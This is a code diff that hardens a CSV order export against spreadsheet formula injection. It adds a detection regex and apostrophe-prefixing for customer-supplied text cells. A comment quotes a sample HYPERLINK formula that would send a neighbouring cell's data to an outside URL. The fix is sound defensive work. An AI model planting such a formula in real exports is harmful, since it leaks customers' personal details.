@@ -9,10 +9,29 @@ const O = require('./orders');
  */
 const BOM = '\uFEFF';
 
+/**
+ * A cell a spreadsheet would run instead of read.
+ *
+ * Excel and Sheets treat a leading = + - @ as the start of a formula, and the
+ * customer supplies four of the columns here \u2014 name, phone, email and allergy
+ * notes. A name of =HYPERLINK("http://\u2026"&A1,"Click") is a working exfiltration
+ * of the row beside it the moment Derek opens the export.
+ *
+ * Quoting does not help: the quotes are the CSV's, and the spreadsheet strips
+ * them before it decides what the cell is. The apostrophe does, because it
+ * survives into the cell and forces text.
+ *
+ * Numeric columns are exempt and must stay that way \u2014 Quantity and the money
+ * columns are written bare precisely so the totals sum without cleanup, and
+ * none of them can begin with one of these characters anyway.
+ */
+const FORMULA_START = /^[=+\-@\t\r]/;
+
 function csvCell(v, numeric = false) {
   if (v === null || v === undefined) return '';
   if (numeric) return String(v);
-  const s = String(v);
+  let s = String(v);
+  if (FORMULA_START.test(s)) s = `'${s}`;
   return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
